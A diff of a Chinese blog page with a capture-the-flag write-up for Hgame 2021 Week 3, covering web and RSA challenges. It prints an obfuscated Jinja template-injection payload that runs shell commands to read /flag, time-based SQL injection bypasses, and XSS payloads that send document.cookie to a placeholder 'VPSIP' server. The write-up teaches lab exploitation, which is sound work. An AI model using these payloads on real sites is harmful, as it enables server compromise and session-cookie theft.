@@ -524,19 +524,16 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="引言">引言</h2>
-<p>Hgame 2021 Week 3</p>
+                <h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>Hgame 2021 Week 3</p>
 <p>喵呜呜，第三周好难啊！</p>
 <p>这周过年比较忙，就随意看了看吧。</p>
-<h2 id="Web">Web</h2>
-<h3 id="Forgetful">Forgetful</h3>
-<blockquote>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Forgetful"><a href="#Forgetful" class="headerlink" title="Forgetful"></a>Forgetful</h3><blockquote>
 <p>Liki 总是忘记很多事情，于是她灵机一动，用新学会的 Python 写了一个 TodoList，快用起来吧！</p>
-<p><a target="_blank" rel="noopener" href="https://todolist.liki.link/">https://todolist.liki.link/</a></p>
+<p><a target="_blank" rel="noopener" href="https://todolist.liki.link/">https://todolist.liki.link/</a> </p>
 </blockquote>
-<p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210214220715777.png" alt=""></p>
+<p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210214220715777.png"></p>
 <p>查看 页面存在 SSTI.</p>
-<p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210214220749054.png" alt=""></p>
+<p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210214220749054.png"></p>
 <p><strong>Payload:</strong></p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">""</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fcla"</span><span class="token string">"ss\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fba"</span><span class="token string">"se\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fsubcla"</span><span class="token string">"sses\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">408</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fin"</span><span class="token string">"it\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fglo"</span><span class="token string">"bals\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fbuiltins\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fimport\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"popen"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"ls -al /"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"> total <span class="token number">104</span>
@@ -566,19 +563,19 @@ dr-xr-xr-x  <span class="token number">13</span> root root    <span class="token
 drwxrwxrwt   <span class="token number">1</span> root root <span class="token number">4096</span> Feb <span class="token number">14</span> <span class="token number">11</span>:40 tmp
 drwxr-xr-x   <span class="token number">1</span> root root <span class="token number">4096</span> Apr  <span class="token number">3</span>  <span class="token number">2020</span> usr
 drwxr-xr-x   <span class="token number">1</span> root root <span class="token number">4096</span> Apr  <span class="token number">3</span>  <span class="token number">2020</span> var<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210214215906213.png" alt=""></p>
+<p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210214215906213.png"></p>
 <p>但是发现读不了根目录的 flag，发现 <code>bash</code> 或者 <code>nc</code> 也反弹不了 shell，emmm</p>
 <p>然后试了 <code>wc -l /flag</code> 发现并没有被拦，其他文件也能读。（没过滤 <code>flag</code> <code>cat</code></p>
-<p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210214225949655.png" alt=""></p>
+<p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210214225949655.png"></p>
 <p>所以推测是 <strong>输出的字符串中如果出现关键字则拦截</strong>。</p>
 <p>试试发现从后往前读可以，最终 payload：</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">""</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fcla"</span><span class="token string">"ss\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fba"</span><span class="token string">"se\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fsubcla"</span><span class="token string">"sses\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">408</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fin"</span><span class="token string">"it\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fglo"</span><span class="token string">"bals\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fbuiltins\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fimport\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"popen"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"tail -c 35 /flag"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>或者 <code>cat /flag|base64</code> 也行。</p>
-<p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210214230458663.png" alt=""></p>
+<p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210214230458663.png"></p>
 <p><code>hgame{h0w_4bou7+L3arn!ng~PythOn^Now?}</code></p>
 <p>气死我了，这就去读源码。</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">""</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fcla"</span><span class="token string">"ss\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fba"</span><span class="token string">"se\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fsubcla"</span><span class="token string">"sses\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">408</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fin"</span><span class="token string">"it\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fglo"</span><span class="token string">"bals\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fbuiltins\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fimport\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"popen"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"ls -al"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210214221640298.png" alt=""></p>
+<p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210214221640298.png"></p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">total <span class="token number">40</span>
 drwxr-xr-x <span class="token number">5</span> root root <span class="token number">4096</span> Feb <span class="token number">13</span> <span class="token number">13</span>:59 <span class="token builtin class-name">.</span>
 drwxr-xr-x <span class="token number">1</span> root root <span class="token number">4096</span> Feb <span class="token number">11</span> <span class="token number">16</span>:13 <span class="token punctuation">..</span>
@@ -753,12 +750,9 @@ login_manager<span class="token punctuation">.</span>login_view <span class="tok
     app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>果然是检查渲染后的结果里是否有 <code>hgame</code> 或者 <code>emagh</code>，有的话就直接返回 <code>Stop!!!</code>。</p>
 <p>居然有个 MySQL 数据库，嘿嘿信息都有了。</p>
-<h3 id="Liki-Jail">Liki-Jail</h3>
-<blockquote>
-<p>漫长的追捕结束了，作恶多端的 Switch 被警官 Liki 捉拿归案，关押在离奇监狱<br>
-不过 Switch 好像有着不可告人的秘密，有着必须要完成的事情，他必须要逃离监狱<br>
-不巧的是监狱管理系统刚好正在维护，只有管理员可以登录系统，该怎么办呢…</p>
-<p><a target="_blank" rel="noopener" href="https://jailbreak.liki.link/">https://jailbreak.liki.link/</a></p>
+<h3 id="Liki-Jail"><a href="#Liki-Jail" class="headerlink" title="Liki-Jail"></a>Liki-Jail</h3><blockquote>
+<p>漫长的追捕结束了，作恶多端的 Switch 被警官 Liki 捉拿归案，关押在离奇监狱<br> 不过 Switch 好像有着不可告人的秘密，有着必须要完成的事情，他必须要逃离监狱<br> 不巧的是监狱管理系统刚好正在维护，只有管理员可以登录系统，该怎么办呢……</p>
+<p><a target="_blank" rel="noopener" href="https://jailbreak.liki.link/">https://jailbreak.liki.link/</a> </p>
 </blockquote>
 <p>过滤了 空格 <code>-</code> <code>'</code> <code>"</code> <code>=</code></p>
 <p>用 <code>\</code> 转义掉引号，试了试 <code>username=\</code>, <code>password=/**/Or/**/sleep(10)#</code> 果然能够 sleep。</p>
@@ -875,12 +869,11 @@ header <span class="token operator">=</span> <span class="token punctuation">{</
 <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
     main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>最后登录拿到 flag。</p>
-<p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210218220834339.png" alt=""></p>
+<p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210218220834339.png"></p>
 <p><code>hgame{7imeB4se_injeCti0n+hiDe~th3^5ecRets}</code></p>
-<h3 id="Arknights">Arknights</h3>
-<blockquote>
+<h3 id="Arknights"><a href="#Arknights" class="headerlink" title="Arknights"></a>Arknights</h3><blockquote>
 <p>r4u十连了！r4u没出夕和年！r4u自闭了！r4u写了个抽卡模拟器想要证明自己不是非酋，这一切都是鹰角的错。r4u用git部署到了自己的服务器上，然而这一切都被大黑客liki看在了眼里。 flag位于网站根目录flag.php中</p>
-<p><a target="_blank" rel="noopener" href="http://84f327c77d.arknights.r4u.top">http://84f327c77d.arknights.r4u.top</a></p>
+<p><a target="_blank" rel="noopener" href="http://84f327c77d.arknights.r4u.top/">http://84f327c77d.arknights.r4u.top</a> </p>
 </blockquote>
 <p>好耶，<strong>是 git 泄露！</strong></p>
 <p>先把源码拉下来。</p>
@@ -1155,13 +1148,12 @@ header <span class="token operator">=</span> <span class="token punctuation">{</
 TzoxNzoiRWVlZWVlZXZhbGxsbGxsbGwiOjE6e3M6MzoibXNnIjtPOjk6IkNhcmRzUG9vbCI6Mjp7czo1OiJjYXJkcyI7TjtzOjE1OiIAQ2FyZHNQb29sAGZpbGUiO3M6ODoiZmxhZy5waHAiO319.Y2Q1NjAzYWE3MjAxOWEwM2NjOWEwY2ZkNzk0ZmEwNzQ=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>改 cookies 再访问即可拿到 flag。</p>
 <p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210221015432199.png" alt="flag"></p>
-<h3 id="Post-to-zuckonit2-0">Post to zuckonit2.0</h3>
-<blockquote>
+<h3 id="Post-to-zuckonit2-0"><a href="#Post-to-zuckonit2-0" class="headerlink" title="Post to zuckonit2.0"></a>Post to zuckonit2.0</h3><blockquote>
 <p>d1gg12 的博客被日穿以后，他想办法学了更深入的 XSS 防护方法， 现在这个博客看上去已经坚不可摧了…是这样吗？</p>
-<p><a target="_blank" rel="noopener" href="http://zuckonit-2.0727.site:5000/">http://zuckonit-2.0727.site:5000/</a></p>
+<p><a target="_blank" rel="noopener" href="http://zuckonit-2.0727.site:5000/">http://zuckonit-2.0727.site:5000/</a> </p>
 </blockquote>
 <p>还是 XSS。</p>
-<p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210224011159368.png" alt=""></p>
+<p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210224011159368.png"></p>
 <p>给了源码在 <code>/static/www.zip</code></p>
 <p><code>app.py</code></p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
@@ -1325,29 +1317,24 @@ TzoxNzoiRWVlZWVlZXZhbGxsbGxsbGwiOjE6e3M6MzoibXNnIjtPOjk6IkNhcmRzUG9vbCI6Mjp7czo1
 <p>于是这里就有漏洞。</p>
 <p>就构造一个 payload 把引号闭合，然后带着 cookie 打到 VPS 上。</p>
 <pre class="line-numbers language-none"><code class="language-none">meow"+$.get("http://VPSIP/"+document.cookie);//<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210221221935061.png" alt=""></p>
+<p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210221221935061.png"></p>
 <p>post 的内容的话就放个指向 preview 的 iframe。</p>
 <pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>preview<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>后端替换后返回</p>
 <pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>preview<span class="token punctuation">"</span></span> <span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>还是有效的。</p>
+<p>还是有效的。 </p>
 <p>然后算个 md5 提交。</p>
-<p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210222222308322.png" alt=""></p>
+<p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210222222308322.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">token=568fda45ba279640fc974e68b592366d82e1b74dfbc18c92ba4df52e6870e7c2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>最后改 cookie，拿 flag.</p>
 <p><code>hgame{simple_csp_bypass&amp;a_small_mistake_on_the_replace_function}</code></p>
 <p>这当然是非预期解啦 2333.</p>
-<h3 id="Post-to-zuckonit-another-version">Post to zuckonit another version</h3>
-<blockquote>
-<p>d1gg12 的博客被日穿以后，他想办法学了更深入的 XSS 防护方法， 现在这个博客看上去已经坚不可摧了…是这样吗？<br>
-<strong>hint1:</strong> 查看网页源代码<br>
-<strong>hint2:</strong> 关于“更深入的xss防护方法”： 看看返回头？<br>
-<strong>hint3:</strong> RegExp<br>
-<strong>hint4:</strong> <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace</a></p>
-<p><a target="_blank" rel="noopener" href="http://zuckonit-2-another.0727.site:5050/">http://zuckonit-2-another.0727.site:5050/</a></p>
+<h3 id="Post-to-zuckonit-another-version"><a href="#Post-to-zuckonit-another-version" class="headerlink" title="Post to zuckonit another version"></a>Post to zuckonit another version</h3><blockquote>
+<p>d1gg12 的博客被日穿以后，他想办法学了更深入的 XSS 防护方法， 现在这个博客看上去已经坚不可摧了…是这样吗？<br> <strong>hint1:</strong> 查看网页源代码<br> <strong>hint2:</strong> 关于“更深入的xss防护方法”： 看看返回头？<br> <strong>hint3:</strong> RegExp<br> <strong>hint4:</strong> <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace</a></p>
+<p><a target="_blank" rel="noopener" href="http://zuckonit-2-another.0727.site:5050/">http://zuckonit-2-another.0727.site:5050/</a> </p>
 </blockquote>
 <p>（来复现一下）</p>
-<p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210224011141306.png" alt=""></p>
+<p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210224011141306.png"></p>
 <p><code>app.py</code></p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
 <span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
@@ -1475,14 +1462,14 @@ TzoxNzoiRWVlZWVlZXZhbGxsbGxsbGwiOjE6e3M6MzoibXNnIjtPOjk6IkNhcmRzUG9vbCI6Mjp7czo1
 <p>根据官方 WriteUp，可以通过构造 <code>{任意匹配的字符串}|{想要注⼊的字符串}</code> 这样的正则表达式来给页面注入元素。</p>
 <p>再根据 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace">String.prototype.replace()</a> 的特殊变量名</p>
 <p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210224013614092.png" alt="特殊变量名"></p>
-<p>主页还是 post</p>
+<p>主页还是 post </p>
 <pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>preview<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>于是就可以利用 分组 结合 <code>$n</code> 来得到尖括号。</p>
 <p>单引号还是能用的，嘿嘿。</p>
-<p><strong>payload:</strong></p>
+<p><strong>payload:</strong> </p>
 <pre class="line-numbers language-none"><code class="language-none">(.)iframe src=.preview.(.)|$1img src=x onerror=top.location='//VPSIP/'+document.cookie$2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>然后拿到 cookie</p>
-<p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210224015157203.png" alt=""></p>
+<p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210224015157203.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">token=6a506f5c3eff9ffe9dc573bc93629038f61a7fcdd7662efb441451b08b0c6671<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>拿到 flag</p>
 <p><code>hgame{CSP_iS_VerY_5trlct&amp;0nly_C@n_uSe_3vil.Js!}</code></p>
@@ -1492,11 +1479,13 @@ TzoxNzoiRWVlZWVlZXZhbGxsbGxsbGwiOjE6e3M6MzoibXNnIjtPOjk6IkNhcmRzUG9vbCI6Mjp7czo1
 </blockquote>
 <pre class="line-numbers language-none"><code class="language-none">iframe|$`input size=11 onfocus=window.open('vps-ip'+document.cookie)
 autofocus$'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h2 id="Crypto">Crypto</h2>
-<h3 id="LikiPrime">LikiPrime</h3>
-<blockquote>
+
+
+
+
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="LikiPrime"><a href="#LikiPrime" class="headerlink" title="LikiPrime"></a>LikiPrime</h3><blockquote>
 <p>Wow! RSA!</p>
-<p><a target="_blank" rel="noopener" href="https://prime.liki.link/">https://prime.liki.link/</a></p>
+<p><a target="_blank" rel="noopener" href="https://prime.liki.link/">https://prime.liki.link/</a> </p>
 </blockquote>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
 
@@ -1527,14 +1516,13 @@ c <span class="token operator">=</span> <span class="token builtin">pow</span><s
 <span class="token comment"># n = 15361898878235696574667000105109009720717806584760935092206242960407549236363501417213696346370999607974104247856479458833772412536980365740161717369268547876567930581662460946856562030722330783421995955447378594119758550329759849393535018344139103042143621239011469955648205934903904045564846822159998174879695774419450399723970148270141003002902927002767984254099972288746243481084381643719731958360702561818663569730597624966561268824737610893516032068613120089855690580047620589196079907477458543783300282393495461746306096415443274084362956267239186823089349090398919748814938872938478097065267156231648487203329412422615711711886164634059723362167236118521458497248305115764510762731915291882155494011713295462603221439763218477455674584662524137991730891776826849188975650354165106378834014987695592746836998002232826678339919918799781246827459617082687425955430641815518416878015728514477287192934193957833532996687234554280263817068106805440848475668830505180172049674756979856286907198648267160926305328986853052888831678087029867946180609</span>
 <span class="token comment"># e = 65537</span>
 <span class="token comment"># c = 7927187628026055322783940901550651937893953660065534609714001711924456963095603013667085470146144874981960574233466397443449977149997357471575431695025415526421127927424585253533999961265066779103259623451208111709082292139347059312149137665426462381816329178229484680275368657450003046701355985014009700915439417466826446848877329284810802949440433122207430136944380576095681081740197798597559437163702511712448892986978229285577672410865991889634686024629071902793778620692548548234276678653195648305462703623579369309956481606223043040903082180559720551235515700080661234190693094571406679557502413049745325301747588707839920522910923018864009003988475371258742969932381590308381543035539043149634871622927695645953044249331889058081699783884965964986919852075768119185486506729958481688848547730131040350180411446263394686119546781350542737049112800140601734883325024073000156078427592350484379976615561586860882656403198952361411599125358422676828954908797542225611418969233985502900316342896903161811894061826308302594273209131132802270416006</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>p, q 都是 2**n - 1，懒了直接去 <a target="_blank" rel="noopener" href="http://factordb.com">http://factordb.com</a> 求解，得到</p>
+<p>p, q 都是 2**n - 1，懒了直接去 <a target="_blank" rel="noopener" href="http://factordb.com/">http://factordb.com</a> 求解，得到</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">p <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">1279</span> <span class="token operator">-</span> <span class="token number">1</span>
 q <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">2203</span> <span class="token operator">-</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>然后直接解就好。</p>
 <p><code>hgame{Mers3nne~Pr!Me^re4l1y_s0+5O-li7tle!}</code></p>
 <hr>
-<h2 id="小结">小结</h2>
-<p>噢，Misc 忘记做了啊，问题不大（（</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>噢，Misc 忘记做了啊，问题不大（（</p>
 <p>喵呜呜，我好菜啊，题目好难啊！！！</p>
 <p>就这样吧（</p>
 <p><em>（溜了溜了喵</em></p>
@@ -2100,7 +2088,7 @@ q <span class="token operator">=</span> <span class="token number">2</span> <spa
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             <br>
                         &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">308.3k</span>&nbsp;字
+                class="white-color">308.1k</span>&nbsp;字
                                                                                     <span id="busuanzi_container_site_pv">
 			|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                     class="white-color"></span>&nbsp;次
